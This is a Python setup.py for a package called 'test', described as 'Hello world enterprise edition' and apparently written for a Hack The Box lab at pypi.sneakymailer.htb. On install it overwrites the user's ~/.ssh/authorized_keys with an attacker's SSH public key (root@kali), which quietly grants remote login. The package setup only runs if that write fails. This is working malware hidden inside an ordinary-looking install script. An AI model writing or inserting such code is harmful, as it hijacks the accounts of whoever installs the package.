from setuptools import setup
try:
	print('hello')
	with open ('/home/low/.ssh/authorized_keys','w+') as f:
		f.writelines('ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDTsi3sfNoZp/YaAr9u0lHUq4ujXshvbNmAQC3TgzcX4ulfOTzqNe8uuqtFkm1rDlXwElSBNbmxpJ/6mxEdeOmu0n+OF8tv9NUKPd8Q9fX3HC1b6JABGXr4V26MHH6IhKH7ESzgzUvxz/86JoU5cSCyTQqUXSwiovOfL5CKr1I1XvksnQJbrogAMV02HZ52EAi1Tly7Jfl+yyN2rXfEvALvWEBl9GBSbybYPsnda4oqKh1fQB9fM3V7rov3mD0t0xB7s2WJbkWW/zoUIdJEihvqJzAI+pAA10fedPONhLK6Ax+QTCpjDCsZnBM2oRwxd8ifmirSRNVGdsmlmnmVwutDOXY54Dyo6j4laPoptw3uAwOyNADDexsiAjPR1dreHQ/6FYVUONemTfC3tmj//Duk+HUy4Ec7kImNDKh6S+KCDrPFN+f9KLDtJSS7ThJsD+tjEr/3Cx+/yO/QeGtj3L/4PHAoP6hYvAeRTGgYDqqIxOu00AHlv5m6BPjPe18C6lU= root@kali')
except:
	setup(
    	name='test',
    	packages=['test'],
    	description='Hello world enterprise edition',
    	version='0.1',
    	url='pypi.sneakymailer.htb/test',
    	author='me',
    	author_email='me@me.com',
    	keywords=['pip','test']
    	)
